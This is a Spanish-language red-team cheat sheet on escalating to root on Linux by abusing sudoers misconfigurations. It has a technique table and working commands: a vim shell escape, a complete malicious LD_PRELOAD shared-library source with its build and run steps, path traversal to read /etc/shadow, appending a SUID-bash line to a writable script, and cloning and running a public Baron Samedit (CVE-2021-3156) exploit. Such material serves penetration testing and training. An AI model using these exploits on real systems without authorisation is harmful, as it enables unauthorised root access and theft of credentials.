---
aliases:
  - "Sudo abuse"
  - "Sudoers Abuse"
  - Abusing Sudoers Privilege
  - Sudo PrivEsc
tags:
  - type/cheatsheet
  - env/linux
  - technique/privilege-escalation
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Privilege Escalation]]"
kind: CheatSheet
linked:
  - "[[Linux Privilege Escalation]]"
  - "[[Linux PrivEsc - PATH Hijacking]]"
---
# Linux PrivEsc - Abusing Sudoers

***

## Cheatsheet

| **Técnica**                          | **Cómo identificarlo**                                     | **Cómo explotarlo**                                                                       |
| ------------------------------------ | ---------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **NOPASSWD a binario GTFOBins**      | `sudo -l` → `(root) NOPASSWD: /usr/bin/find`                | Consultar [GTFOBins](https://gtfobins.github.io/) sección "Sudo".                         |
| **LD_PRELOAD preservado**            | `sudo -l` → `env_keep+=LD_PRELOAD`                          | Compilar `.so` malicioso, `sudo LD_PRELOAD=/tmp/shell.so <comando_permitido>`.            |
| **LD_LIBRARY_PATH preservado**       | `sudo -l` → `env_keep+=LD_LIBRARY_PATH`                     | Copiar `.so` legítimo con misma API pero código modificado, inyectar via LD_LIBRARY_PATH. |
| **Wildcard en comando permitido**    | `(root) /bin/cat /var/log/*`                                | `sudo /bin/cat /var/log/../../etc/shadow`.                                                |
| **Script escribible con sudo**       | `(root) NOPASSWD: /opt/custom.sh` + `chmod` permisivo       | Editar el script directamente → reverse shell o SUID bash.                                |
| **sudoedit con wildcard**            | `(root) sudoedit /etc/app/*.conf`                           | `sudoedit /etc/app/../../root/.ssh/authorized_keys` (CVE-2023-22809).                     |
| **Sudo versión vulnerable**          | `sudo -V` → < 1.9.5p2                                       | Baron Samedit (CVE-2021-3156), heap overflow pre-auth.                                    |
| **pwfeedback enabled**               | Config antigua + `sudo -V \| grep pwfeedback`               | CVE-2019-18634 en sudo < 1.8.31.                                                          |

^linux-privesc-sudoers

## Explotación típica

### 1. GTFOBins lookup (más común)

```bash
sudo -l
# Output ejemplo:
# (root) NOPASSWD: /usr/bin/vim

# GTFOBins → vim → sudo:
sudo vim -c ':!/bin/bash'
```

### 2. LD_PRELOAD hijack

```bash
sudo -l | grep -i LD_PRELOAD
# env_keep += "LD_PRELOAD"

cat > /tmp/shell.c << 'SH'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
SH

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <cualquier_comando_permitido>
```

### 3. Wildcard escape

```bash
# sudo -l muestra: (root) NOPASSWD: /usr/bin/less /var/log/*
# `less` no soporta command injection directo, pero sí traversal:
sudo /usr/bin/less /var/log/../../etc/shadow
# Dentro de less: puede usarse !comando para shell escape
```

### 4. Script editable + sudo

```bash
sudo -l
# (root) NOPASSWD: /opt/maintenance.sh
ls -la /opt/maintenance.sh
# -rwxrwxr-x ... maintenance group writable
id
# uid=1001(user) gid=1001(user) groups=1001(user),1002(maintenance)

echo 'chmod u+s /bin/bash' >> /opt/maintenance.sh
sudo /opt/maintenance.sh
/bin/bash -p
```

### 5. Baron Samedit (CVE-2021-3156)

```bash
sudo -V | head -1
# Sudo version 1.8.27  ← vulnerable

# Exploit público:
# https://github.com/blasty/CVE-2021-3156
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0  # o ajustar offset por distro
```

## Notas clave

- **`sudo -l` puede requerir contraseña** según config. Si `!authenticate` está en sudoers → no pide auth.
- **Nunca asumir NOPASSWD**: leer línea completa del output. `(root) /usr/bin/find` (sin NOPASSWD) requiere password del usuario actual.
- **`env_reset` activado por default** en sudoers modernos: bloquea propagación de envvars salvo las listadas en `env_keep`.
- En contextos con MFA en sudo (pam_google_authenticator, pam_u2f), el bypass por CVEs kernel sigue siendo opción (ver MOC).
- **Sudo tokens**: si un usuario ejecutó sudo recientemente en misma sesión TTY, el token cacheado puede reusarse. Post-exploit enum: `sudo -n true 2>/dev/null && echo "sudo sin password"`.

***
